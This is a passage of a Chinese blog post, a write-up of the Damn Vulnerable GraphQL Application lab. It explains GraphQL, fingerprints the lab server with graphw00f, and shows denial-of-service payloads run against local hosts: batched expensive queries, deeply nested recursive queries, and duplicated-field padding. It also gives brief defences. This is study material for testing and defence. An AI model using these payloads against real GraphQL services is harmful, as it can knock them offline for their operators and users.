@@ -1,0 +1,1587 @@
+<!DOCTYPE html>
+<html lang="zh-CN,en,default">
+  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <link rel="preload" href="/css/first.css" as="style">
+  
+
+  <!-- 页面元数据 -->
+  
+  <title>初探 GraphQL 安全 - TARI TARI</title>
+  
+    <meta name="keywords" content="GraphQL">
+  
+
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    <link rel="shortcut icon" type='image/x-icon' href="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/favicon.ico">
+  
+
+  <!-- import link -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/first.css">
+
+  
+
+  
+  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
+  
+
+  <script id="loadcss"></script>
+
+  
+<script>
+if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
+    document.write(
+	'<style>'+
+		'html{'+
+			'overflow-x: hidden !important;'+
+			'overflow-y: hidden !important;'+
+		'}'+
+		'.kill-ie{'+
+			'text-align:center;'+
+			'height: 100%;'+
+			'margin-top: 15%;'+
+			'margin-bottom: 5500%;'+
+		'}'+
+	'</style>'+
+    '<div class="kill-ie">'+
+        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
+        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
+        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
+        '<a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support"><strong>了解详情 ></strong></a>'+
+    '</div>');
+</script>
+
+
+<noscript>
+	<style>
+		html{
+			overflow-x: hidden !important;
+			overflow-y: hidden !important;
+		}
+		.kill-noscript{
+			text-align:center;
+			height: 100%;
+			margin-top: 15%;
+			margin-bottom: 5500%;
+		}
+	</style>
+    <div class="kill-noscript">
+        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
+        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
+        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>了解详情 ></strong></a>
+    </div>
+</noscript>
+
+</head>
+
+  <body>
+    
+
+<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+  <div class='container'>
+  <div id='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+            TARI TARI
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-home fa-fw'></i>主页
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="搜索..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-home fa-fw'></i>主页
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+    <div id="l_body">
+      <div id="l_cover">
+  
+    
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
+          
+            <div class='cover-bg lazyload placeholder' data-bg="/img/home.jpeg"></div>
+          
+          <div class='cover-body'>
+  <div class='top'>
+    
+    
+      <p class="title">TARI TARI</p>
+    
+    
+      <p class="subtitle">记录信安路上的点滴 (:</p>
+    
+  </div>
+  <div class='bottom'>
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        </div>
+    
+  
+  </div>
+
+      <div id="safearea">
+        <div class="body-wrapper" id="pjax-container">
+          
+
+<div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        初探 GraphQL 安全
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2022年1月30日 14:19</p>
+  </a>
+</div>
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateUpdated" datetime="2022-02-01T12:31:50+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2022年2月1日 12:31</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="初探 GraphQL 安全" data-path="/p/2022/graphql-dvga/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+          
+            
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：3.8k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：16分钟</p>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  
+  <h2 id="GraphQL-是什么"><a href="#GraphQL-是什么" class="headerlink" title="GraphQL 是什么"></a>GraphQL 是什么</h2><p>GraphQL规范早在2012年<sup><a target="_blank" rel="noopener" href="https://graphql.org/">[1]</a></sup>已在Facebook的移动端开始使用并在2015年开源，没错，与其说是一种查询语言不如说是一种规范，其嵌入到各种语言中使用，不同语言的实现和使用或多或少都有些许不多，所以觉得说是规范更为合适。</p>
+<p>先来看一种场景，在Facebook中搜索<del>Biden</del>这个用户，点击进去加载主要由3部分组成：姓名头像简介粉丝、发表的内容、各个Posts的点赞评论和评论内容。我们从搜索处点击某个用户即传入的是userId，按照一般Restful API获取数据方式为：根据userId获取姓名简介头像等个人信息，然后在获取该userId下最近发表的内容id，根据每个内容id在获取内容点赞评论信息，一般涉及多个 API 请求接口</p>
+<p><img src="/img/graphql-dvga/VRyV7Jh.png" class="lazyload" data-srcset="/img/graphql-dvga/VRyV7Jh.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="VRyV7Jh"></p>
+<center>https://www.howtographql.com/basics/1-graphql-is-the-better-rest/</center>
+
+
+
+<p>如果是GraphQL，因数据经过图数据结构抽象，只需访问一次接口，即可把想要的数据查询出来</p>
+<p><img src="/img/graphql-dvga/z9VKnHs.png" class="lazyload" data-srcset="/img/graphql-dvga/z9VKnHs.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="z9VKnHs"></p>
+<p>这里性能上的优势就可以体现出来了。</p>
+<p>虽然Restful API也可以做一个接口，根据传入的userId把要查的数据查出来，不过当有其他业务场景需要在这基础上增加返回字段时，那就又需要增加一个接口，加上现在一般是前后端分离架构，后端的修改往往需要与前端协调，这里的每更改一个点涉及的沟通成本、改动引发成本在项目达到一定规模后需要一定的工作量。</p>
+<p>如果前端能够以一种查询方式，不依赖于具体的后端API接口，首先前端不用看后端API接口文档，沟通量也会降低。而且刚刚上述加载视频评论的场景，对于API获取的数据无需在前端做很大的处理，<code>所查即所得</code>，那么在加载性能上，也会有很大的改善～</p>
+<p>于是乎，GraphQL 产生了，它是在数据存储时以把数据转换为图的形式，然后在查的时候就更高效了，还有就是前端在获取数据，调API的时，因为后端的API不是死的，他能以他想获取他仅想要具体的表具体字段，不同表不同字段的数据，查过来也不需要做什么处理，就可以用了。相当于，前端在调API接口的时候，就可以指定具体的数据表和字段，非常方便～</p>
+<h2 id="GraphQL-安全性问题"><a href="#GraphQL-安全性问题" class="headerlink" title="GraphQL 安全性问题"></a>GraphQL 安全性问题</h2><p>相信这时候大家应该也知道，由于GraphQL更多是偏向于前端查询，在配置或编写不当的时候，经常容易出现全局越权或者未授权的情况发生。</p>
+<p>当然也还有其他安全问题，跟进靶场看看先～</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application">https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application</a></p>
+<p>插一句，如果没学过GraphQL可以花1小时多丢时间跟着学学写写 <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=ZQL7tL2S0oQ">https://www.youtube.com/watch?v=ZQL7tL2S0oQ</a> ，不过里面没有提及修改和删除操作，可以尝试自己写一下，熟练一下GraphQL的编写，最后可对比一下靶场中 Python 的写法，这样食用更佳～</p>
+<h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p><a target="_blank" rel="noopener" href="https://github.com/dolevf/graphw00f">https://github.com/dolevf/graphw00f</a></p>
+<p>找 graphql 路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 main.py -d -t http://tari.local:5000</span><br></pre></td></tr></table></figure>
+
+<p>识别具体指纹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 main.py -f -t http://tari.local:5000/graphql</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Checking <span class="keyword">if</span> GraphQL is available at http://tari.local:5000/graphql...</span><br><span class="line">[!] Found GraphQL.</span><br><span class="line">[*] Attempting to fingerprint...</span><br><span class="line">[*] Discovered GraphQL Engine: (Graphene)</span><br><span class="line">[!] Attack Surface Matrix: https://github.com/dolevf/graphw00f/blob/main/docs/graphene.md</span><br><span class="line">[!] Technologies: Python</span><br><span class="line">[!] Homepage: https://graphene-python.org</span><br><span class="line">[*] Completed.</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="拒绝服务-未限制批处理"><a href="#拒绝服务-未限制批处理" class="headerlink" title="拒绝服务 - 未限制批处理"></a>拒绝服务 - 未限制批处理</h2><p>GraphQL 支持批量查询请求，先简单了解一下 <code>Graphene</code>，nodejs 使用的 apollo 类似，不过 Graphene 是先 <code>core/views.py</code> 注册路由，定义 scheme，对应的 query 有</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">node = graphene.relay.Node.Field()</span><br><span class="line">pastes = graphene.<span class="type">List</span>(PasteObject, public=graphene.Boolean())</span><br><span class="line">paste = graphene.Field(PasteObject, p_id=graphene.String())</span><br><span class="line">system_update = graphene.String()</span><br><span class="line">system_diagnostics = graphene.String(username=graphene.String(), password=graphene.String(), cmd=graphene.String())</span><br><span class="line">system_health = graphene.String()</span><br><span class="line">read_and_burn = graphene.Field(PasteObject, p_id=graphene.Int())</span><br></pre></td></tr></table></figure>
+
+<p>第一关提示为请求 <code>systemUpdate</code> 查询</p>
+<p><a target="_blank" rel="noopener" href="https://docs.graphene-python.org/en/latest/types/objecttypes/#resolvers">Graphene 的对应解析为</a> systemUpdate -&gt; resolve_system_update 即最终调用 resolve_system_update 方法，该方法调用 security.simulate_load 这里题目假设这个为高IO处理，所以使用了 sleep 来进行模拟，我们可以适当把 loads 改为 <code>[20, 30, 40, 50]</code> ，重启一下服务。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">simulate_load</span>():</span></span><br><span class="line">  loads = [<span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>]</span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  limit = random.choice(loads)</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> count &gt; limit:</span><br><span class="line">      <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
+
+<p>这样单个请求看起来正常点，2-5秒左右。</p>
+<p>然后普通的 query 是在单个花括号的，由于 graphql 支持批处理，可以通过列表包含各个请求，然后 graphql 同时去处理，如果都是些高IO花销请求，那就可以造成DOS了，如</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/graphql</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:5000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.26.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>404</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="json">[&#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;query &#123;\n  systemUpdate\n&#125;&quot;</span>, <span class="attr">&quot;variables&quot;</span>: []&#125;, &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;query &#123;\n  systemUpdate\n&#125;&quot;</span>, <span class="attr">&quot;variables&quot;</span>: []&#125;,&#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;query &#123;\n  systemUpdate\n&#125;&quot;</span>, <span class="attr">&quot;variables&quot;</span>: []&#125;, &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;query &#123;\n  systemUpdate\n&#125;&quot;</span>, <span class="attr">&quot;variables&quot;</span>: []&#125;,&#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;query &#123;\n  systemUpdate\n&#125;&quot;</span>, <span class="attr">&quot;variables&quot;</span>: []&#125;, &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;query &#123;\n  systemUpdate\n&#125;&quot;</span>, <span class="attr">&quot;variables&quot;</span>: []&#125;, &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;query &#123;\n  systemUpdate\n&#125;&quot;</span>, <span class="attr">&quot;variables&quot;</span>: []&#125;]</span></span><br></pre></td></tr></table></figure>
+
+<p>原先一个只在 2-5秒，这时返回时间变成 25s 左右</p>
+<p>防御方法：</p>
+<p>高 IO schema，限制单次传入次数</p>
+<p>一些参考</p>
+<p><a target="_blank" rel="noopener" href="https://www.apollographql.com/blog/apollo-client/performance/batching-client-graphql-queries/">https://www.apollographql.com/blog/apollo-client/performance/batching-client-graphql-queries/</a></p>
+<p><a target="_blank" rel="noopener" href="https://lab.wallarm.com/graphql-batching-attack/">https://lab.wallarm.com/graphql-batching-attack/</a></p>
+<h2 id="拒绝服务-深度递归查询"><a href="#拒绝服务-深度递归查询" class="headerlink" title="拒绝服务 - 深度递归查询"></a>拒绝服务 - 深度递归查询</h2><p>在GraphQL中，查询时如果指定的两个类型存在相互引用，那么查询我们去查时就可以无限套娃最终导致指数爆炸</p>
+<p>通过查看代码的数据模型，发现 Owner 和 Paste 存在相互引用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Owner</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">  __tablename__ = <span class="string">&#x27;owners&#x27;</span></span><br><span class="line">  ...</span><br><span class="line">  paste = db.relationship(<span class="string">&#x27;Paste&#x27;</span>, backref=<span class="string">&#x27;Owner&#x27;</span>, lazy=<span class="string">&#x27;dynamic&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Paste</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">  __tablename__ = <span class="string">&#x27;pastes&#x27;</span></span><br><span class="line">  ...</span><br><span class="line">  owner = db.relationship(</span><br><span class="line">    Owner,</span><br><span class="line">    backref=<span class="string">&#x27;pastes&#x27;</span></span><br><span class="line">  )</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+
+<p>尝试套娃</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    pastes &#123;</span><br><span class="line">        owner &#123;</span><br><span class="line">            paste &#123;</span><br><span class="line">                owner &#123;</span><br><span class="line">                    paste &#123;</span><br><span class="line">                        id</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>报错</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;errors&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;Cannot query field \&quot;owner\&quot; on type \&quot;PasteObjectConnection\&quot;.&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;locations&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;line&quot;</span>: <span class="number">5</span>,</span><br><span class="line">                    <span class="attr">&quot;column&quot;</span>: <span class="number">17</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>找了一下代码，好像没 <code>PasteObjectConnection</code> 这种东西，看了下wp发现要加上 edge 和 node，</p>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/42622912/in-graphql-whats-the-meaning-of-edges-and-node">https://stackoverflow.com/questions/42622912/in-graphql-whats-the-meaning-of-edges-and-node</a></p>
+<p>搜了下这两个字段的含义，原来graphql为了处理分页和mutate时做了一种叫 relay 的机制。仔细看我们刚刚到报错提及 <code>Connection</code> ，一个 connection 由对象组成，但我们代码里好像没定义这个东西</p>
+<p><a target="_blank" rel="noopener" href="https://docs.graphene-python.org/en/latest/relay/nodes/">https://docs.graphene-python.org/en/latest/relay/nodes/</a></p>
+<p>在看了一下 graphene 文档，发现类中定义了 <code>graphene.relay.Node</code> 即会启用 relay 分页机制</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PasteObject</span>(<span class="params">SQLAlchemyObjectType</span>):</span></span><br><span class="line">  p_id = graphene.String(source=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">    model = Paste</span><br><span class="line">    interfaces = (graphene.relay.Node, )</span><br></pre></td></tr></table></figure>
+
+<p>关于 relay 分页机制进一步讲解可以参考：<a target="_blank" rel="noopener" href="https://www.apollographql.com/blog/graphql/explaining-graphql-connections/">https://www.apollographql.com/blog/graphql/explaining-graphql-connections/</a></p>
+<p>也就是说，当 <code>pastes</code> 查询访问 <code>paste</code> 类型的 <code>owner</code> 类型时，查询的是 <code>PasteObject</code> 里的 <code>owner</code> ，里面的数据是可以访问的，此时 <code>paste</code> 和 <code>owner</code> 为一个 <code>coneection</code> ，而当进一步查询 <code>owner</code> 类型的 <code>paste</code> 类型时，此时变成查 <code>PasteObjectConnection</code> 的 owner 字段，相当于跨 connection 查询，而 <code>PasteObjectConnection</code> 并没有 <code>owner</code> 这个字段，所以就报错了。</p>
+<p>所以跨 connection 查应该是先查 connection 边连着的 node，就是 owner 里 paste 的 id 了，也就是变成</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    pastes &#123;</span><br><span class="line">        owner &#123;</span><br><span class="line">            paste &#123;</span><br><span class="line">                edges &#123;</span><br><span class="line">                    node &#123;</span><br><span class="line">                        id</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回结果正常</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;pastes&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;owner&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;paste&quot;</span>: &#123;</span><br><span class="line">                        <span class="attr">&quot;edges&quot;</span>: [</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="attr">&quot;node&quot;</span>: &#123;</span><br><span class="line">                                    <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;UGFzdGVPYmplY3Q6MQ==&quot;</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        ]</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在我们的套的层数要足够多，才能让 CPU 飙高，甚至打崩 graphql 服务，这里套了50多层，返回连接超时，但CPU占用不高，也没打崩，（nodejs 可以，不知为啥这里不行了…）</p>
+<h2 id="拒绝服务-资源密集型"><a href="#拒绝服务-资源密集型" class="headerlink" title="拒绝服务 - 资源密集型"></a>拒绝服务 - 资源密集型</h2><p>其实就请求不同的查询接口，看看哪个返回时间更久，然后在去请求时间花销更长的</p>
+<h2 id="拒绝服务-重复字段填充"><a href="#拒绝服务-重复字段填充" class="headerlink" title="拒绝服务 - 重复字段填充"></a>拒绝服务 - 重复字段填充</h2><p>garphql 一般的查询时不会禁用重复字段，即可以填充无限个相同字段，让服务端去处理</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">query &#123;</span><br><span class="line">  pastes &#123;</span><br><span class="line">  	ipAddr # 1</span><br><span class="line">    ipAddr # 2</span><br><span class="line">    ipAddr # 3</span><br><span class="line">    ipAddr # 4</span><br><span class="line">    ...</span><br><span class="line">    ipAddr # 10,000</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但本机测试，除了延迟，和刚请求那会会有小小波动，好像没啥影响…，不过能检测禁用掉这种请求方式肯定最好，因为这里塞的更多，最终也只会返回一个字段</p>
